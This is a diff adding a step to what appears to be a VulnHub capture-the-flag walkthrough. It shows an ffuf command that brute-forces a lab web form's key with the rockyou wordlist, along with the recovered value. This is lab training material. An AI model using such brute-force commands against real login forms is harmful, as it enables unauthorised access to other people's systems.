@@ -90,8 +90,20 @@ by adding this string to the path in the website, page below is shown :
 
 ![keypage](https://github.com/Git-K3rnel/VulnHub/assets/127470407/1c4156b7-7c45-4c95-bbb5-c9cb7be3d9ac)
 
+and the page source has a comment :
 
+```text
+<!-- this form isn't connected to mysql, password ain't that complex --!>
+```
 
+so we can some how brute force the password here, i used `ffuf` for doing this, but you can also use a custome python script or some other tools :
+
+```text
+root@kali: ffuf -w /usr/share/wordlists/rockyou.txt  -H "Content-Type: application/x-www-form-urlencoded" -X POST -d "key=FUZZ" -u http://192.168.127.232/kzMb5nVYJw/index.php -fw 19
+
+[Status: 200, Size: 145, Words: 9, Lines: 7, Duration: 6ms]
+    * FUZZ: elite
+```
 
 
 
